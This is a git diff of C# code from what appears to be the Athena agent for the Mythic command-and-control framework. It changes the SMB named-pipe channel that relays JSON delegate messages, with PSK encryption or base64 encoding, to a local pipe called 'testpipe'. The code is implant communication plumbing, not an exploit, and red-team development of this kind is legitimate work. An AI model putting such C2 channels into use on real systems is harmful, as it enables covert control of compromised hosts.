@@ -1,4 +1,4 @@
-﻿using Athena.Mythic.Model.Response;
+﻿using Athena.Models.Mythic.Response;
 using Athena.Utilities;
 using Newtonsoft.Json;
 using System;
@@ -19,7 +19,7 @@ namespace Athena.Config
         public DateTime killDate { get; set; }
         public int sleep { get; set; }
         public int jitter { get; set; }
-        public SmbServer smbServer { get; set; }
+        public SmbServer smbConfig { get; set; }
 
         public MythicConfig()
         {
@@ -30,7 +30,7 @@ namespace Athena.Config
             int jitter = int.TryParse("0", out jitter) ? jitter : 10;
             this.jitter = jitter;
             this.currentConfig = new SmbClient(this.uuid, this);
-            this.smbServer = new SmbServer();
+            this.smbConfig = new SmbServer();
         }
     }
 
@@ -46,109 +46,109 @@ namespace Athena.Config
         private string recv { get; set; }
         private string send { get; set; }
         private MythicConfig baseConfig { get; set; }
-        public encrypted { get; set; }
+        public bool encrypted { get; set; }
 
-        public SmbClient(string uuid, MythicConfig config)
+    public SmbClient(string uuid, MythicConfig config)
+    {
+        //this.callbackHost = "%SERVER%";
+        //this.psk = "AESPSK";
+        //this.encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
+        //this.pipeName = "pipe_name";
+        this.callbackHost = ".";
+        this.pipeName = "testpipe";
+        this.psk = "";
+        this.encryptedExchangeCheck = bool.Parse("False");
+        //this.uuid = uuid;
+        this.baseConfig = config;
+        if (!string.IsNullOrEmpty(this.psk))
         {
-            //this.callbackHost = "%SERVER%";
-            //this.psk = "AESPSK";
-            //this.encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
-            //this.pipeName = "pipe_name";
-            this.callbackHost = ".";
-            this.pipeName = "testpipe";
-            this.psk = "";
-            this.encryptedExchangeCheck = bool.Parse("False");
-            //this.uuid = uuid;
-            this.baseConfig = config;
-            if (!string.IsNullOrEmpty(this.psk))
-            {
-                this.crypt = new PSKCrypto(uuid, this.psk);
-                this.encrypted = true;
-            }
-
-            Task.Run(() => Connect(this.callbackHost, this.pipeName));
+            this.crypt = new PSKCrypto(uuid, this.psk);
+            this.encrypted = true;
         }
 
-        public bool Connect(string host, string pipename)
+        Task.Run(() => Connect(this.callbackHost, this.pipeName));
+    }
+
+    public bool Connect(string host, string pipename)
+    {
+        try
         {
+            this.pipeStream = new NamedPipeClientStream
+                (this.callbackHost, this.pipeName, PipeDirection.InOut, PipeOptions.Asynchronous);
+
+            //Should I add a timeout for this?
+            this.pipeStream.Connect();
             try
             {
-                this.pipeStream = new NamedPipeClientStream
-                    (this.callbackHost, this.pipeName, PipeDirection.InOut, PipeOptions.Asynchronous);
-
-                //Should I add a timeout for this?
-                this.pipeStream.Connect();
-                try
+                // Read user input and send that to the client process.
+                using (BinaryWriter _bw = new BinaryWriter(pipeStream))
+                using (BinaryReader _br = new BinaryReader(pipeStream))
                 {
-                    // Read user input and send that to the client process.
-                    using (BinaryWriter _bw = new BinaryWriter(pipeStream))
-                    using (BinaryReader _br = new BinaryReader(pipeStream))
+                    while (true)
                     {
-                        while (true)
+                        //Wait for a message to be ready to send.
+                        while (string.IsNullOrEmpty(this.send)) ;
+                        DelegateMessage msg = new DelegateMessage()
                         {
-                            //Wait for a message to be ready to send.
-                            while (string.IsNullOrEmpty(this.send)) ;
-                            DelegateMessage msg = new DelegateMessage()
-                            {
-                                uuid = this.baseConfig.uuid,
-                                message = this.send,
-                                c2_profile = "smbclient"
-                            };
-                            this.send = "";
+                            uuid = this.baseConfig.uuid,
+                            message = this.send,
+                            c2_profile = "smbclient"
+                        };
+                        this.send = "";
 
-                            var buf = Encoding.ASCII.GetBytes(JsonConvert.SerializeObject(msg));
-                            _bw.Write((uint)buf.Length);
-                            _bw.Write(buf);
+                        var buf = Encoding.ASCII.GetBytes(JsonConvert.SerializeObject(msg));
+                        _bw.Write((uint)buf.Length);
+                        _bw.Write(buf);
 
-                            //Wait for response
-                            var len = _br.ReadUInt32();
-                            var temp = new string(_br.ReadChars((int)len));
-                            this.recv = temp;
-                        }
+                        //Wait for response
+                        var len = _br.ReadUInt32();
+                        var temp = new string(_br.ReadChars((int)len));
+                        this.recv = temp;
                     }
                 }
-                // Catch the IOException that is raised if the pipe is broken
-                // or disconnected.
-                catch (IOException e)
-                {
-                }
-                catch
-                {
-                }
-                return true;
             }
-            catch (Exception e)
+            // Catch the IOException that is raised if the pipe is broken
+            // or disconnected.
+            catch (IOException e)
             {
-                return false;
             }
+            catch
+            {
+            }
+            return true;
         }
-
-        public async Task<string> Send(object obj)
+        catch (Exception e)
         {
-            this.recv = "";
-            string json = JsonConvert.SerializeObject(obj);
-            if (this.encrypted)
-            {
-                json = this.crypt.Encrypt(json);
-            }
-            else
-            {
-                json = Misc.Base64Encode(Globals.mc.MythicConfig.uuid + json);
-            }
-            this.send = json;
-
-            while (string.IsNullOrEmpty(this.recv)) ;
-
-            if (this.encrypted)
-            {
-                string retString = this.recv;
-                return this.crypt.Decrypt(retString);
-            }
-            else
-            {
-                string retString = this.recv;
-                return Misc.Base64Decode(retString).Substring(36);
-            }
+            return false;
         }
     }
+
+    public async Task<string> Send(object obj)
+    {
+        this.recv = "";
+        string json = JsonConvert.SerializeObject(obj);
+        if (this.encrypted)
+        {
+            json = this.crypt.Encrypt(json);
+        }
+        else
+        {
+            json = Misc.Base64Encode(Globals.mc.MythicConfig.uuid + json);
+        }
+        this.send = json;
+
+        while (string.IsNullOrEmpty(this.recv)) ;
+
+        if (this.encrypted)
+        {
+            string retString = this.recv;
+            return this.crypt.Decrypt(retString);
+        }
+        else
+        {
+            string retString = this.recv;
+            return Misc.Base64Decode(retString).Substring(36);
+        }
+    }
+}
 }
